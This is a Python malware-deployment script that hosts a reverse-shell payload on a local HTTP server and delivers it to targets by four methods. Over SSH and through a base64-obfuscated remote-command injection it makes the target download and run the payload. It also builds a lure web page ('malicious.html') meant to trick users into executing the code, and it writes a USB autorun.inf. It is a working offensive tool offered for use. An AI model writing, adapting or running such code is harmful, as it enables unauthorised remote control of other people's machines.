import os
import sys
import socket
import subprocess
import time
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import base64

class FileHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/payload.py':
            # Serve the reverse shell script
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
            with open('reverse_shell.py', 'rb') as f:
                self.wfile.write(f.read())
        else:
            super().do_GET()

def start_http_server(port=8000):
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = HTTPServer(('0.0.0.0', port), FileHandler)
    print(f"HTTP server started on port {port}")
    server.serve_forever()

def execute_remote_command(target_ip, command, ssh_port=22, ssh_user=None, ssh_key=None):
    ssh_cmd = ['ssh']
    
    if ssh_port != 22:
        ssh_cmd.extend(['-p', str(ssh_port)])
    
    if ssh_key:
        ssh_cmd.extend(['-i', ssh_key])
    
    if ssh_user:
        ssh_cmd.append(f"{ssh_user}@{target_ip}")
    else:
        ssh_cmd.append(target_ip)
    
    ssh_cmd.append(command)
    
    try:
        result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30)
        return result.returncode == 0, result.stdout, result.stderr
    except Exception as e:
        return False, "", str(e)

def deploy_via_ssh(target_ip, ssh_user=None, ssh_key=None, ssh_port=22):
    print(f"Deploying to {target_ip} via SSH...")
    
    commands = [
        f"curl -s http://{get_local_ip()}:8000/payload.py -o /tmp/payload.py",
        "chmod +x /tmp/payload.py",
        "python3 /tmp/payload.py &"
    ]
    
    for cmd in commands:
        success, stdout, stderr = execute_remote_command(
            target_ip, cmd, ssh_port, ssh_user, ssh_key
        )
        if not success:
            print(f"Failed to execute: {cmd}")
            print(f"Error: {stderr}")
            return False
    
    print("Payload deployed successfully!")
    return True

def deploy_via_web(target_ip):
    print(f"Preparing web-based deployment for {target_ip}...")
    
    html_content = f"""
    <html>
    <body>
    <script>
    // Attempt to download and execute payload
    fetch('http://{get_local_ip()}:8000/payload.py')
        .then(response => response.text())
        .then(script => {{
            // Try to execute via various methods
            if (window.electron) {{
                window.electron.eval(script);
            }} else if (window.chrome && window.chrome.webview) {{
                window.chrome.webview.postMessage({{type: 'execute', script: script}});
            }}
        }});
    </script>
    <h1>Loading...</h1>
    </body>
    </html>
    """
    
    with open('malicious.html', 'w') as f:
        f.write(html_content)
    
    print(f"Serve malicious.html and trick user into visiting it")

def deploy_via_usb():
    print("Creating USB payload...")
    
    autorun_content = """
    [autorun]
    open=python.exe payload.py
    shellexecute=python.exe payload.py
    action=Open folder to view files
    """
    
    with open('autorun.inf', 'w') as f:
        f.write(autorun_content)
    
    subprocess.run(['cp', 'reverse_shell.py', 'payload.py'])
    
    print("Files ready for USB deployment:")
    print("- autorun.inf")
    print("- payload.py")
    print("Copy these to USB drive")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def deploy_via_rce(target_ip, rce_command):
    print(f"Deploying via RCE to {target_ip}...")
    
    payload = f"""
    curl -s http://{get_local_ip()}:8000/payload.py -o /tmp/payload.py
    chmod +x /tmp/payload.py
    nohup python3 /tmp/payload.py > /dev/null 2>&1 &
    """
    
    encoded_payload = base64.b64encode(payload.encode()).decode()
    
    full_command = f"{rce_command} 'echo {encoded_payload} | base64 -d | bash'"
    
    try:
        result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("Payload deployed via RCE!")
            return True
        else:
            print(f"RCE deployment failed: {result.stderr}")
            return False
    except Exception as e:
        print(f"RCE deployment error: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 deploy.py <method> [options]")
        print("Methods:")
        print("  ssh <target_ip> [ssh_user] [ssh_key] [ssh_port]")
        print("  web <target_ip>")
        print("  usb")
        print("  rce <target_ip> <rce_command>")
        print("\nExample: python3 deploy.py ssh 192.168.1.100 user ~/.ssh/id_rsa 22")
        sys.exit(1)
    
    method = sys.argv[1].lower()
    
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()
    time.sleep(2)
    
    if method == "ssh":
        if len(sys.argv) < 3:
            print("SSH method requires: deploy.py ssh <target_ip> [ssh_user] [ssh_key] [ssh_port]")
            sys.exit(1)
        
        target_ip = sys.argv[2]
        ssh_user = sys.argv[3] if len(sys.argv) > 3 else None
        ssh_key = sys.argv[4] if len(sys.argv) > 4 else None
        ssh_port = int(sys.argv[5]) if len(sys.argv) > 5 else 22
        
        deploy_via_ssh(target_ip, ssh_user, ssh_key, ssh_port)
    
    elif method == "web":
        if len(sys.argv) < 3:
            print("Web method requires: deploy.py web <target_ip>")
            sys.exit(1)
        
        target_ip = sys.argv[2]
        deploy_via_web(target_ip)
    
    elif method == "usb":
        deploy_via_usb()
    
    elif method == "rce":
        if len(sys.argv) < 4:
            print("RCE method requires: deploy.py rce <target_ip> <rce_command>")
            sys.exit(1)
        
        target_ip = sys.argv[2]
        rce_command = sys.argv[3]
        deploy_via_rce(target_ip, rce_command)
    
    else:
        print(f"Unknown method: {method}")
        sys.exit(1)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nDeployment server stopped")

if __name__ == "__main__":
    main()